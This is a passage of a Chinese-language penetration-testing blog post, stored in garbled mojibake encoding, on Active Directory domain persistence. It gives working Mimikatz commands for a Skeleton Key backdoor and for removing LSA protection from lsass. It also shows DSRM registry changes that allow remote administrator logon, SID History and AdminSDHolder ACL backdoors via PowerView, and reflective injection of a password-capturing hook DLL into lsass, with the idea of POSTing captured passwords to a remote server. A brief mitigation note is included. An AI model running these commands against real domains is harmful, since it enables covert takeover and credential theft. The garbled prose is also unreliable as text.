è¿›è¡Œè®¤è¯ï¼ŒåŒæ—¶åŸæœ‰å¯†ç ä»ç„¶æœ‰æ•ˆã€‚è¯¥æŠ€æœ¯é€šè¿‡æ³¨å…¥lsass.exe è¿›ç¨‹å®ç°ï¼Œåˆ›å»ºçš„ Skeleton Key ä»…ä¿ç•™åœ¨å†…å­˜ä¸­ï¼Œå¦‚æœåŸŸæ§é‡å¯ï¼ŒSkeleton Keyå°±ä¼šå¤±æ•ˆã€‚åˆ©ç”¨è¯¥æŠ€æœ¯éœ€è¦æ‹¥æœ‰åŸŸç®¡ç†å‘˜çº§åˆ«çš„æƒé™ã€‚</p><p><strong>å¸¸è§„åˆ©ç”¨</strong></p><p>å°†Mimikatzä¸Šä¼ åˆ°åŸŸæ§ï¼Œæ‰§è¡Œä¸‹é¢å‘½ä»¤åˆ›å»ºSkeleton Keyåé—¨</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;privilege::debug&quot; &quot;misc::seleton&quot; exit<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151710521.png" alt="image-20240417190149716"></p><p>æ‰§è¡Œåï¼Œï¼Œå°†ä¸ºæ‰€æœ‰çš„åŸŸè´¦æˆ·è®¾ç½®ä¸€ä¸ªç›¸åŒçš„å¯†ç â€mimikatzâ€ï¼Œä»è€Œå¯ä»¥ç™»å½•åŸŸæ§ã€‚</p><p><strong>ç¼“è§£æªæ–½</strong></p><p>å¾®è½¯åœ¨2014å¹´3æœˆæ·»åŠ äº†LSA(Local Security Authority,æœ¬åœ°å®‰å…¨æœºæ„)ä¿æŠ¤ç­–ç•¥ç”¨æ¥é˜²æ­¢å¯¹lsass.exe è¿›ç¨‹çš„å†…å­˜è¯»å–å’Œä»£ç æ³¨å…¥ã€‚é€šè¿‡æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œå¯ä»¥å¼€å¯æˆ–å…³é—­LSA ä¿æŠ¤ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">å¼€å¯LSAä¿æŠ¤ç­–ç•¥</span><br>reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa&quot; /v RunAsPPL /t REG_DWORD /d 1 /f<br><span class="hljs-meta prompt_"># </span><span class="language-bash">å…³é—­LSAä¿æŠ¤ç­–ç•¥</span><br>reg delete &quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa&quot; /v RunAsPPL<br></code></pre></td></tr></table></figure><p>é‡å¯ç³»ç»Ÿåï¼ŒMimikatzçš„ç›¸å…³æ“ä½œéƒ½ä¼šå¤±è´¥ã€‚æ­¤æ—¶å³ä½¿å·²ç»è·å–äº†Debugæƒé™ä¹Ÿæ— æ³•è¯»å–ç”¨æˆ·å“ˆå¸Œå€¼ï¼Œæ›´æ— æ³•å®‰è£…SkeletonKey.</p><p><img src="http://cdn.clown2024.cn/202407151710522.png" alt="image-20240417195040956"></p><p>ä¸è¿‡ï¼ŒMimikatzåœ¨2013å¹´å°±å·²ç»æ”¯æŒç»•è¿‡LSAä¿æŠ¤ï¼Œè¯¥åŠŸèƒ½éœ€è¦Mimikatzé¡¹ç›®ä¸­çš„mimidrv.sysé©±åŠ¨æ–‡ä»¶ï¼ŒSkeleton Keyçš„å®‰è£…å‘½ä»¤å°±å˜æˆå¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz # privilege::debug<br>mimikatz # !+<br>mimikatz # !processprotect /process:lsass.exe /remove<br>mimikatz # misc::skeleton<br></code></pre></td></tr></table></figure><h2 id="åˆ›å»ºdsrmåŸŸåé—¨"><a href="#åˆ›å»ºDSRMåŸŸåé—¨" class="headerlink" title="åˆ›å»ºDSRMåŸŸåé—¨"></a>åˆ›å»ºDSRMåŸŸåé—¨</h2><p>DSRM(Directory Services Restore Modeï¼Œç›®å½•æœåŠ¡è¿˜åŸæ¨¡å¼)æ˜¯åŸŸæ§åˆ¶å™¨çš„å®‰å…¨æ¨¡å¼å¯åŠ¨é€‰é¡¹ï¼Œç”¨äºä½¿æœåŠ¡å™¨è„±æœºï¼Œä»¥è¿›è¡Œç´§æ€¥ç»´æŠ¤ã€‚åœ¨åˆæœŸå®‰è£… Windows åŸŸæœåŠ¡æ—¶ï¼Œå®‰è£…å‘å¯¼ä¼šæç¤ºç”¨æˆ·è®¾ç½® DSRM çš„ç®¡ç†å‘˜å¯†ç ã€‚æœ‰äº†è¯¥å¯†ç åï¼Œç½‘ç»œç®¡ç†å‘˜å¯ä»¥åœ¨åæœŸåŸŸæ§å‘ç”Ÿé—®é¢˜æ—¶ä¿®å¤ã€è¿˜åŸæˆ–é‡å»ºæ´»åŠ¨ç›®å½•æ•°æ®åº“ã€‚</p><p>åœ¨åŸŸæ§ä¸ŠDSRMè´¦æˆ·å®é™…ä¸Šå°±æ˜¯æœ¬åœ°ç®¡ç†å‘˜è´¦æˆ·ã€‚é€šè¿‡åœ¨åŸŸæ§ä¸Šè¿è¡ŒNTDSUtil(æ˜¯ä¸€ä¸ªè‡ªå¸¦çš„ç”¨äºç®¡ç†å’Œç»´æŠ¤æ´»åŠ¨ç›®å½•çš„å·¥å…·)ï¼Œå¯ä»¥ä¸ºDSRMè´¦æˆ·ä¿®æ”¹å¯†ç ï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">è¿›å…¥ntdsutil</span><br>ntdsutil<br><span class="hljs-meta prompt_"># </span><span class="language-bash">è¿›å…¥è®¾ç½®DSRMè´¦æˆ·å¯†ç è®¾ç½®æ¨¡å¼</span><br>set dsrm password<br><span class="hljs-meta prompt_"># </span><span class="language-bash">åœ¨å½“å‰åŸŸæ§ä¸Šæ¢å¤DSRMå¯†ç </span><br>reset password on server null<br><span class="hljs-meta prompt_"># </span><span class="language-bash">è¾“å…¥æ–°å¯†ç </span><br>&lt;password&gt;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">é€€å‡ºDSRMå¯†ç è®¾ç½®æ¨¡å¼</span><br>q<br><span class="hljs-meta prompt_"># </span><span class="language-bash">é€€å‡ºntdsutil</span><br>q<br></code></pre></td></tr></table></figure><p>æµ‹è¯•äººå‘˜å¯ä»¥é€šè¿‡ä¿®æ”¹ DSRM è´¦æˆ·çš„å¯†ç ï¼Œä»¥ç»´æŒå¯¹åŸŸæ§åˆ¶å™¨æƒé™ã€‚è¯¥æŠ€æœ¯é€‚ç”¨äºWindows Server 2008 åŠä»¥åç‰ˆæœ¬çš„æœåŠ¡å™¨ï¼Œå¹¶éœ€è¦æ‹¥æœ‰åŸŸç®¡ç†å‘˜çº§åˆ«çš„æƒé™ã€‚</p><p>ä¸‹é¢æ˜¯Mimikatzçš„åˆ©ç”¨è¿‡ç¨‹</p><ol><li><p>è¯»å–SAMæ–‡ä»¶è·å–DSRMè´¦æˆ·çš„å“ˆå¸Œå€¼</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; exit<br></code></pre></td></tr></table></figure></li><li><p>ä¿®æ”¹DSRMçš„ç™»é™†æ¨¡å¼ï¼Œå…è®¸è¯¥è´¦æˆ·çš„è¿œç¨‹ç™»é™†ã€‚å¯ä»¥é€šè¿‡ç¼–è¾‘æ³¨å†Œè¡¨çš„ DsrmAdminLogonBehavior é”®å€¼æ¥å®ç°ï¼Œå¯é€‰ç”¨çš„ç™»å½•æ¨¡å¼æœ‰ä»¥ä¸‹3ç§ã€‚</p><p>0ï¼šé»˜è®¤å€¼ï¼Œåªæœ‰å½“åŸŸæ§åˆ¶å™¨é‡å¯å¹¶è¿›å…¥ DSRM æ¨¡å¼æ—¶ï¼Œæ‰å¯ä»¥ä½¿ç”¨ DSRM ç®¡ç†å‘˜è´¦å·ã€‚</p><p>1ï¼šåªæœ‰å½“æœ¬åœ° ADã€DS æœåŠ¡åœæ­¢æ—¶ï¼Œæ‰å¯ä»¥ä½¿ç”¨ DSRM ç®¡ç†å‘˜è´¦å·ç™»å½•åŸŸæ§åˆ¶å™¨ã€‚</p><p>2ï¼šåœ¨ä»»ä½•æƒ…å†µä¸‹ï¼Œéƒ½å¯ä»¥ä½¿ç”¨ DSRM ç®¡ç†å‘˜è´¦å·ç™»å½•åŸŸæ§åˆ¶å™¨ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬å°±è¦ä¿®æ”¹ç™»é™†æ¨¡å¼ä¸º2ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa&quot; /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f<br></code></pre></td></tr></table></figure></li><li><p>ç„¶åå°±å¯ä»¥é€šè¿‡DSRMè´¦å·å¯¹åŸŸæ§è¿›è¡Œæ§åˆ¶äº†ã€‚æˆ‘ä»¬å¯ä»¥æ ¹æ®ä¸Šé¢è·å¾—çš„å“ˆå¸Œå¯¹åŸŸæ§æ‰§è¡Œå“ˆå¸Œä¼ é€’æ”»å‡»è·å–åŸŸæ§æƒé™</p><p><img src="http://cdn.clown2024.cn/202407151710523.png" alt="image-20240418230425352"></p></li></ol><h2 id="sid-historyçš„åˆ©ç”¨"><a href="#SID-Historyçš„åˆ©ç”¨" class="headerlink" title="SID Historyçš„åˆ©ç”¨"></a>SID Historyçš„åˆ©ç”¨</h2><p><strong>SID &amp; SID History</strong></p><p>åœ¨ Windows ç³»ç»Ÿä¸­ï¼ŒSID(Security Identifiers)æ˜¯æŒ‡å®‰å…¨æ ‡è¯†ç¬¦ï¼Œæ˜¯ç”¨æˆ·ã€ç”¨æˆ·ç»„æˆ–å…¶ä»–å®‰å…¨ä¸»ä½“çš„å”¯ä¸€ã€ä¸å¯å˜æ ‡è¯†ç¬¦ã€‚</p><p>Windows æ ¹æ® ACL(è®¿é—®æ§åˆ¶åˆ—è¡¨)æˆäºˆæˆ–æ‹’ç»å¯¹èµ„æºçš„è®¿é—®å’Œç‰¹æƒï¼ŒACL ä½¿ç”¨SID æ¥å”¯ä¸€æ ‡è¯†ç”¨æˆ·åŠå…¶ç»„æˆå‘˜èº«ä»½ã€‚å½“ç”¨æˆ·ç™»å½•åˆ°è®¡ç®—æœºæ—¶ï¼Œä¼šç”Ÿæˆä¸€ä¸ªè®¿é—®ä»¤ç‰Œå…¶ä¸­åŒ…å«ç”¨æˆ·å’Œç»„ SIDå’Œç”¨æˆ·æƒé™çº§åˆ«ã€‚å½“ç”¨æˆ·è¯·æ±‚è®¿é—®èµ„æºæ—¶ï¼Œå°†æ ¹æ® ACL æ£€æŸ¥è®¿é—®ä»¤ç‰Œä»¥å…è®¸æˆ–æ‹’ç»å¯¹ç‰¹å®šå¯¹è±¡çš„ç‰¹å®šæ“ä½œã€‚</p><p>SID History æ˜¯ä¸€ä¸ªæ”¯æŒåŸŸè¿ç§»æ–¹æ¡ˆçš„å±æ€§ï¼Œä½¿å¾—ä¸€ä¸ªè´¦æˆ·çš„è®¿é—®æƒé™å¯ä»¥æœ‰æ•ˆåœ°å…‹éš†åˆ°å¦ä¸€ä¸ªè´¦æˆ·ï¼Œè¿™åœ¨åŸŸè¿ç§»è¿‡ç¨‹ä¸­éå¸¸æœ‰ç”¨ã€‚ä¾‹å¦‚ï¼Œå½“Domain A ä¸­çš„ç”¨æˆ·è¿ç§»åˆ°Domain B æ—¶ï¼Œä¼šåœ¨ Domain Bä¸­åˆ›å»ºä¸€ä¸ªæ–°çš„ç”¨æˆ·è´¦æˆ·ï¼Œå¹¶å°†Domain Aç”¨æˆ·çš„ SID æ·»åŠ åˆ° DomainB çš„ç”¨æˆ·è´¦æˆ·çš„ SID Historyå±æ€§ä¸­ã€‚è¿™å°±ç¡®ä¿äº† DomainBç”¨æˆ·ä»ç„¶æ‹¥æœ‰è®¿é—® DomainA ä¸­èµ„æºçš„æƒé™ã€‚</p><p><strong>åˆ©ç”¨æ–¹æ³•</strong></p><p>æµ‹è¯•äººå‘˜å¯ä»¥å°†åŸŸç®¡ç†å‘˜ç”¨æˆ·çš„SIDæ·»åŠ åˆ°å…¶ä»–åŸŸç”¨æˆ·çš„SID Historyå±æ€§ä¸­ï¼Œä»¥æ­¤å»ºç«‹ä¸€ä¸ªéšè”½çš„åŸŸåé—¨ï¼Œè¯¥æ–¹æ³•éœ€è¦æ‹¥æœ‰åŸŸç®¡ç†å‘˜çº§åˆ«çš„æƒé™ã€‚</p><p>ä»¥åˆ›å»ºç”¨æˆ·Hackerä¸ºä¾‹ï¼š</p><ol><li><p>ä¸Šä¼ mimikatzæ‰§è¡Œä»¥ä¸‹å‘½ä»¤å°†åŸŸç®¡ç†å‘˜çš„SIDæ·»åŠ åˆ°Hackerç”¨æˆ·çš„SID Historyå±æ€§ä¸­</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">Mimikatz &gt; 2.1.0</span><br>mimikatz.exe &quot;privilege::debug&quot; &quot;sid::patch&quot; &quot;sid::add /sam::Hacker /new:Administrator&quot; exit<br><span class="hljs-meta prompt_"># </span><span class="language-bash">Mimikatz &lt; 2.1.0</span><br>mimikatz.exe &quot;privilege::debug&quot; &quot;misc:addsid Hacker ADSAdministrator&quot; exit<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151710524.png" alt="image-20240418231321732"></p></li><li><p>PowerShellæŸ¥çœ‹Hackerç”¨æˆ·çš„å±æ€§ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Import-Module ActiveDirectory<br>Get-ADUser Hacker -Properties SIDHistory<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151710525.png" alt="image-20240418231512445"></p><p>å¯ä»¥å‘ç°Hackerç”¨æˆ·å·²ç»ç»§æ‰¿äº†æƒé™</p></li><li><p>ç„¶åå°±å¯ä»¥é€šè¿‡Hackerç”¨æˆ·æˆåŠŸè¿æ¥åˆ°åŸŸæ§åˆ¶å™¨ï¼Œæ‰§è¡Œ<strong>whoami &#x2F;priv</strong>å¯ä»¥çœ‹åˆ°æ‹¥æœ‰åŸŸç®¡ç†å‘˜çš„æ‰€æœ‰ç‰¹æƒ</p></li></ol><h2 id="åˆ©ç”¨adminsdholderæ‰“é€ åŸŸåé—¨"><a href="#åˆ©ç”¨AdminSDHolderæ‰“é€ åŸŸåé—¨" class="headerlink" title="åˆ©ç”¨AdminSDHolderæ‰“é€ åŸŸåé—¨"></a>åˆ©ç”¨AdminSDHolderæ‰“é€ åŸŸåé—¨</h2><p><strong>AdminSDHolder</strong></p><p>AdminSDHolder æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„ Active Directory å®¹å™¨å¯¹è±¡,ä½äº Domain CN çš„ Systemå®¹å™¨ä¸‹ã€‚AdminSDHolder é€šå¸¸ä½œä¸ºç³»ç»Ÿä¸­æŸäº›å—ä¿æŠ¤å¯¹è±¡çš„å®‰å…¨æ¨¡æ¿ï¼Œä»¥é˜²æ­¢è¿™äº›å¯¹è±¡é­å—æ¶æ„ä¿®æ”¹æˆ–æ»¥ç”¨ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151710526.png" alt="image-20240418231838646"></p><p>å—ä¿æŠ¤å¯¹è±¡é€šå¸¸åŒ…æ‹¬ç³»ç»Ÿçš„ç‰¹æƒç”¨æˆ·å’Œé‡è¦çš„ç»„,å¦‚ Administratorã€Domain Adminsã€Enterprise Admins ä»¥åŠSchema Admins ç­‰ã€‚</p><p>åœ¨æ´»åŠ¨ç›®å½•ä¸­ï¼Œå±æ€§ adminCountç”¨æ¥æ ‡è®°ç‰¹æƒç”¨æˆ·å’Œç»„ã€‚å¯¹äºç‰¹æƒç”¨æˆ·å’Œç»„æ¥è¯´ï¼Œè¯¥å±æ€§å€¼è¢«è®¾ä¸º 1ã€‚é€šè¿‡ AdFind æŸ¥è¯¢ adminCount å±æ€§è®¾ç½®ä¸º1çš„å¯¹è±¡ï¼Œå¯ä»¥æ‰¾åˆ°æ‰€æœ‰å— AdminSDHolder ä¿æŠ¤çš„ç‰¹æƒç”¨æˆ·å’Œç»„</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">æšä¸¾å—ä¿æŠ¤çš„ç”¨æˆ·</span><br>Adfind.exe -b &quot;dc=hacke,dc=testlab&quot; -f &quot;&amp;(objectcategory=person)(amaccountname=*)(admincount=1)&quot; -dn<br><span class="hljs-meta prompt_"># </span><span class="language-bash">æšä¸¾å—ä¿æŠ¤çš„ç»„</span><br>Adfind.exe -b &quot;dc=hacke,dc=testlab&quot; -f &quot;&amp;(objectcategory=group)(admincount=1)&quot; -dn<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151710527.png" alt="image-20240419000448192"></p><p>åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œç³»ç»Ÿå°†å®šæœŸ(æ¯ 60åˆ†é’Ÿ)æ£€æŸ¥å—ä¿æŠ¤å¯¹è±¡çš„å®‰å…¨æè¿°ç¬¦ï¼Œå°†å—ä¿æŠ¤å¯¹è±¡çš„ ACL ä¸ AdminSDHolder å®¹å™¨çš„ ACL è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœäºŒè€…ä¸ä¸€è‡´ï¼Œç³»ç»Ÿå°±ä¼šå°†å—ä¿æŠ¤å¯¹è±¡çš„ ACL å¼ºåˆ¶ä¿®æ”¹ä¸º AdminSDHolder å®¹å™¨çš„ ACLã€‚è¯¥å·¥ä½œé€šè¿‡ SDProp è¿›ç¨‹æ¥å®Œæˆï¼Œè¯¥è¿›ç¨‹ä»¥ 60åˆ†é’Ÿä¸ºä¸€ä¸ªå·¥ä½œå‘¨æœŸã€‚</p><p><strong>åˆ©ç”¨æ–¹æ³•</strong></p><p>åœ¨å®æˆ˜ä¸­,æµ‹è¯•äººå‘˜å¯ä»¥ç¯¡æ”¹ AdminSDHolder å®¹å™¨çš„ ACL é…ç½®ã€‚å½“ç³»ç»Ÿè°ƒç”¨ SDPropè¿›ç¨‹æ‰§è¡Œç›¸å…³å·¥ä½œæ—¶ï¼Œè¢«ç¯¡æ”¹çš„ ACL é…ç½®å°†åŒæ­¥åˆ°å—ä¿æŠ¤å¯¹è±¡çš„ ACL ä¸­ï¼Œä»¥æ­¤å»ºç«‹ä¸€ä¸ªéšè”½çš„åŸŸåé—¨ã€‚åˆ©ç”¨è¯¥æŠ€æœ¯éœ€è¦æ‹¥æœ‰åŸŸç®¡ç†å‘˜çº§åˆ«çš„æƒé™</p><p>æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œé€šè¿‡ PowerView å‘ AdminSDHolder å®¹å™¨å¯¹è±¡æ·»åŠ ä¸€ä¸ª ACLï¼Œä½¿æ™®é€šåŸŸç”¨æˆ· Marcus æ‹¥æœ‰å¯¹ AdminSDHolder çš„â€œå®Œå…¨æ§åˆ¶â€æƒé™ï¼Œé¡¹ç›®åœ°å€ï¼š<a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Import-Module .\PowerView.ps1<br>Add-DomainObjectAcl -TargetSearchBase &quot;LDAP://CN=AdminSDHolder,CN=System,Dc=hack-my<br>DC=com&quot; -PrincipalIdentity Marcus -Rights All -Verbose<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œå,Marcusç”¨æˆ·æˆåŠŸæ‹¥æœ‰AdminSDHolderå®¹å™¨å¯¹è±¡çš„å®Œå…¨æ§åˆ¶æƒé™ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151710528.png" alt="image-20240419001254688"></p><p>ç­‰å¾… 60åˆ†é’Ÿåï¼ŒMarcus ç”¨æˆ·å°†è·å¾—å¯¹ç³»ç»Ÿä¸­çš„ç‰¹æƒç”¨æˆ·å’Œç»„å®Œå…¨æ§åˆ¶æƒé™ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151710529.png" alt="image-20240419001334730"></p><p>è¦æ¸…é™¤å¯¹AdminSDHolderçš„å®Œå…¨æ§åˆ¶æƒé™ï¼Œæ‰§è¡Œä¸‹é¢å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Remove-DomainObjectAcl -TargetSearchBase &quot;LDAP://CN=AdminSDHolder,CN=System,DC=hack-my<br>DC=com&quot; -PrincipalIdentity Marcus Rights All -Verbose<br></code></pre></td></tr></table></figure><h2 id="hook-passwordchangenotify"><a href="#HOOk-PasswordChangeNotify" class="headerlink" title="HOOk PasswordChangeNotify"></a>HOOk PasswordChangeNotify</h2><p>PasswordChangeNotify åœ¨å¾®è½¯å®˜æ–¹æ–‡æ¡£ä¸­çš„åç§°ä¸ºPsamPasswordNotificationRoutine,æ˜¯ä¸€ä¸ª WindowS APIã€‚å½“ç”¨æˆ·é‡ç½®å¯†ç æ—¶ï¼ŒWindowsä¼šå…ˆæ£€æŸ¥æ–°å¯†ç æ˜¯å¦ç¬¦åˆå¤æ‚æ€§è¦æ±‚ï¼Œå¦‚æœå¯†ç ç¬¦åˆè¦æ±‚ï¼ŒLSA ä¼šè°ƒç”¨PasswordChangeNotifyå‡½æ•°åœ¨ç³»ç»Ÿä¸­åŒæ­¥å¯†ç ã€‚è¯¥å‡½æ•°çš„è¯­æ³•å¤§è‡´å¦‚ä¸‹ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151710530.png" alt="image-20240419002150589"></p><p>å½“è°ƒç”¨ PasswordChangeNotify æ—¶ï¼Œç”¨æˆ·åå’Œå¯†ç å°†ä»¥æ˜æ–‡çš„å½¢å¼ä¼ å…¥ã€‚æµ‹è¯•äººå‘˜å¯ä»¥é€šè¿‡ HOOK æŠ€æœ¯ï¼ŒåŠ«æŒPasswordChangeNotify å‡½æ•°çš„æ‰§è¡Œæµç¨‹ï¼Œä»è€Œè·å–ä¼ å…¥çš„æ˜æ–‡å¯†ç ã€‚</p><p>å…¶æµç¨‹å¤§è‡´å¦‚ä¸‹ï¼Œéœ€è¦çš„å·¥å…·æœ‰ï¼šHookPasswordChange.dll(é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/clymb3r/Misc-Windows-Hacking)%E5%92%8CInvoke-ReflectivePEInjection.ps1(%E4%BD%8D%E4%BA%8EPowerSploit%E9%A1%B9%E7%9B%AE%E7%9A%84CodeExecution%E7%9B%AE%E5%BD%95%E4%B8%8B)">https://github.com/clymb3r/Misc-Windows-Hacking)å’ŒInvoke-ReflectivePEInjection.ps1(ä½äºPowerSploité¡¹ç›®çš„CodeExecutionç›®å½•ä¸‹)</a></p><ol><li><p>å°†HookPasswordChange.dllå’ŒInvoke-ReflectivePEInjection.ps1ä¸Šä¼ åˆ°åŸŸæ§ï¼Œå¹¶å°†HookPasswordChange.dlæ³¨å…¥åˆ°lsass.exeè¿›ç¨‹</p><figure class="highlight powershell"><table><tr><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># å¯¼å…¥Invoke-ReflectivePEInjection.ps1</span><br><span class="hljs-built_in">Import-Module</span> .\<span class="hljs-built_in">Invoke-ReflectivePEInjection</span>.ps1<br><span class="hljs-comment"># è¯»å–HookPasswordChange.dllå¹¶å°†å…¶æ³¨å…¥åˆ°lsassè¿›ç¨‹</span><br><span class="hljs-variable">$PEBytes</span> = [<span class="hljs-type">IO.File</span>]::ReadAllBytes(<span class="hljs-string">&#x27;C:\Users\Administrator\HookPasswordChange.dll&#x27;</span>)<br><span class="hljs-built_in">Invoke-ReflectivePEInjection</span> <span class="hljs-literal">-PEBytes</span> <span class="hljs-variable">$PEBytes</span> <span class="hljs-literal">-ProcName</span> lsass<br></code></pre></td></tr></table></figure></li><li><p>å½“ç½‘ç»œç®¡ç†å‘˜ä¿®æ”¹ç”¨æˆ·å¯†ç æ—¶ï¼Œç”¨æˆ·çš„æ–°å¯†ç å°†è®°å½•åœ¨C:\Windows\Temp ç›®å½•çš„passwords.txt æ–‡ä»¶ä¸­</p><p>password.txtä¿å­˜çš„ç›®å½•è¿˜å¯ä»¥è‡ªå®šä¹‰ï¼Œéœ€è¦åœ¨HookPasswordChange.cppæ–‡ä»¶ä¸­ä¿®æ”¹</p></li></ol><p>ä¸ºäº†å°†è·å–çš„ç”¨æˆ·å¯†ç ä¼ å›è¿œç¨‹æœåŠ¡å™¨ï¼Œåœ¨æºç çš„åŸºç¡€ä¸Šå¯ä»¥é€šè¿‡WinNet APIæ·»åŠ HTTPè¯·æ±‚åŠŸèƒ½ï¼Œä»£ç å¤§è‡´å¦‚ä¸‹ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151710531.png" alt="image-20240419004013067"></p><p>åŸæœ¬githubä¸Šé¢æœ‰é¡¹ç›®ä½†æ˜¯ä¸è§äº†ï¼Œåˆ°æ—¶å€™æœ‰æœºä¼šå†è‡ªå·±æ”¹ï¼ˆ</p><p>ä¿®æ”¹åé‡æ–°ç¼–è¯‘ç”ŸæˆHookPasswordChange.dllï¼Œå½“ç®¡ç†å‘˜ä¿®æ”¹å¯†ç æ—¶å°±å¯ä»¥é€šè¿‡postæ–¹æ³•å°†å¯†ç å¸¦åˆ°è¿œç¨‹æœåŠ¡å™¨</p><p><img src="http://cdn.clown2024.cn/202407151710532.png" alt="image-20240419004224553"></p><h1 id="dcsyncæ”»å‡»æŠ€æœ¯"><a href="#DCSyncæ”»å‡»æŠ€æœ¯" class="headerlink" title="DCSyncæ”»å‡»æŠ€æœ¯"></a>DCSyncæ”»å‡»æŠ€æœ¯</h1><p>ä¸€ä¸ªåŸŸç¯å¢ƒå¯ä»¥æ‹¥æœ‰å¤šå°åŸŸæ§åˆ¶å™¨ï¼Œæ¯å°åŸŸæ§åˆ¶å™¨å„è‡ªå­˜å‚¨ç€ä¸€ä»½æ‰€åœ¨åŸŸçš„æ´»åŠ¨ç›®å½•çš„å¯å†™å‰¯æœ¬ï¼Œå¯¹ç›®å½•çš„ä»»ä½•ä¿®æ”¹éƒ½å¯ä»¥ä»æºåŸŸæ§åˆ¶å™¨åŒæ­¥åˆ°æœ¬åŸŸã€åŸŸæ ‘æˆ–åŸŸæ—ä¸­çš„å…¶ä»–åŸŸæ§åˆ¶å™¨ä¸Šã€‚å½“ä¸€ä¸ªåŸŸæ§æƒ³ä»å¦ä¸€ä¸ªåŸŸæ§è·å–åŸŸæ•°æ®æ›´æ–°æ—¶ï¼Œå®¢æˆ·ç«¯åŸŸæ§ä¼šå‘æœåŠ¡ç«¯åŸŸæ§å‘é€ DSGetNCChanges è¯·æ±‚ï¼Œè¯¥è¯·æ±‚çš„å“åº”å°†åŒ…å«å®¢æˆ·ç«¯åŸŸæ§å¿…é¡»åº”ç”¨åˆ°å…¶æ´»åŠ¨ç›®å½•å‰¯æœ¬çš„ä¸€ç»„æ›´æ–°ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼ŒåŸŸæ§åˆ¶å™¨ä¹‹é—´æ¯ 15 åˆ†é’Ÿå°±ä¼šæœ‰ä¸€æ¬¡åŸŸæ•°æ®åŒæ­¥ã€‚</p><p>DCSync æŠ€æœ¯å°±æ˜¯åˆ©ç”¨åŸŸæ§åˆ¶å™¨åŒæ­¥çš„åŸç†,é€šè¿‡Directory Replication Service(DRSæœåŠ¡çš„ IDL_DRSGetNCChanges æ¥å£å‘åŸŸæ§å‘èµ·æ•°æ®åŒæ­¥è¯·æ±‚ã€‚åœ¨ DCSync å‡ºç°å‰ï¼Œè¦è·å¾—æ‰€æœ‰åŸŸç”¨æˆ·çš„å“ˆå¸Œï¼Œæµ‹è¯•äººå‘˜å¯èƒ½éœ€è¦ç™»å½•åŸŸæ§åˆ¶å™¨æˆ–é€šè¿‡å·å½±æ‹·è´æŠ€æœ¯è·å–NTDS.dit æ–‡ä»¶ã€‚åˆ©ç”¨ DCSyncï¼Œæµ‹è¯•äººå‘˜å¯ä»¥åœ¨åŸŸå†…ä»»ä½•ä¸€å°æœºå™¨ä¸Šæ¨¡æ‹Ÿä¸€ä¸ªåŸŸæ§åˆ¶å™¨é€šè¿‡åŸŸæ•°æ®åŒæ­¥å¤åˆ¶çš„æ–¹å¼è·å–æ­£åœ¨è¿è¡Œçš„åˆæ³•åŸŸæ§åˆ¶å™¨ä¸Šçš„æ•°æ®ã€‚æ³¨æ„ï¼ŒDCSyncæ”»å‡»ä¸é€‚ç”¨äºåªè¯»åŸŸæ§åˆ¶å™¨(RODC)</p><p>åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œåªæœ‰Administratorsã€Domain Controllers å’ŒEnterprise Domain Adminsç»„å†…çš„ç”¨æˆ·å’ŒåŸŸæ§åˆ¶å™¨çš„æœºå™¨è´¦æˆ·æ‰æœ‰æ‰§è¡ŒDCSyncæ“ä½œçš„æƒé™ã€‚</p><h2 id="åˆ©ç”¨dcsyncå¯¼å‡ºåŸŸå†…å“ˆå¸Œ"><a href="#åˆ©ç”¨DCSyncå¯¼å‡ºåŸŸå†…å“ˆå¸Œ" class="headerlink" 